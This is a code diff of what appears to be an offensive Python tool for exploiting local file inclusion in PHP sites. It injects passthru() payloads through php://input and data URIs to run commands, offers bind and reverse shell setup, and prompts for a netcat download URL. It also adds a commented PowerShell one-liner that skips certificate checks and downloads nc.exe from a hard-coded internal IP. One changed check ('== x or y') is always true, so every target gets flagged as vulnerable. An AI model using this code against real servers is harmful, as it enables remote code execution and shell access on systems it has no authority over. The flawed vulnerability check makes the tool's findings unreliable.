@@ -81,8 +81,8 @@ class lfi(object):
 		vul = []
 		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
 		self._command = 'echo '+rnd
-		if self.phpInput() == ' \r\n'+rnd+'\r\n': vul.append("PHP://input")
-		if self.dataURI() == ' \r\n'+rnd+'\r\n': vul.append("dataURI")
+		if self.phpInput() == ' \r\n'+rnd+'\r\n' or '\n'+rnd+'\n': vul.append("PHP://input")
+		if self.dataURI() == ' \r\n'+rnd+'\r\n' or '\n'+rnd+'\n': vul.append("dataURI")
 		print ('[*] Target is vulnerable to: \n')
 		for i, j in enumerate(vul, start=1): print (i, j)
 		choice = int(input("\n[*] Enter a choice: "))
@@ -96,7 +96,8 @@ class lfi(object):
 	
 	def phpInput(self):
 		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-		mydata = ("<?php passthru('" + self._command + "'); ?>") if self._isShell else ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd)
+		mydata = ("<?php passthru('" + self._command + "'); ?>") if self._isShell else \
+		("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd)
 		path = self._url + 'php://input'    #the url you want to POST to
 		req = urllib2.Request(path, mydata)
 		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
@@ -275,7 +276,7 @@ def shells(method, shell):
 ''')
 	choice = int(input('>> '))
 	if choice == 1:
-		shellObj.url = str(input("[*] Enter the download URL of netcat: "))
+		shellObj.url = str(input("[*] Enter the download URL of netcat (direct link): "))
 		shellObj.location = str(input("[*] Enter the location to be saved\n(Press enter for the default location): "))
 	if shell == 'reverse':
 		shellObj.ip = str(input("[*] Enter your IP: "))
@@ -288,6 +289,7 @@ def shells(method, shell):
 	if choice == 2: payload = shellObj.payload_linux_python()
 	lfiObj.command = payload
 		
+
 def com(method):
 	if method == 'phpInput':
 		bind = "2. Bind Shell"
@@ -306,6 +308,7 @@ def com(method):
 	elif choice == 2 and method == 'phpInput': shells(method, 'bind')
 	elif choice == 3 and method == 'phpInput': shells(method, 'reverse')
 
+#powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true}; $source="""http://192.168.1.5/nc.exe """; $destination= """C:\\nc.exe"""; $http = new-object System.Net.WebClient; $response= $http.DownloadFile($source, $destination);"
 try: input = raw_input
 except: pass
 
@@ -339,7 +342,7 @@ def main():
 	cls()
 	banner()
 	try:
-		lfiObj.url = str(input("[*] Enter the URL: "))
+		lfiObj.url = str(input("[*] Enter the URL (eg: http://host/lfi.php?page=): "))
 		cookie = str(input("[*] Enter the cookie values (press enter if none):\n"))
 		if cookie == '': cookie = 0
 		lfiObj.cookie = cookie
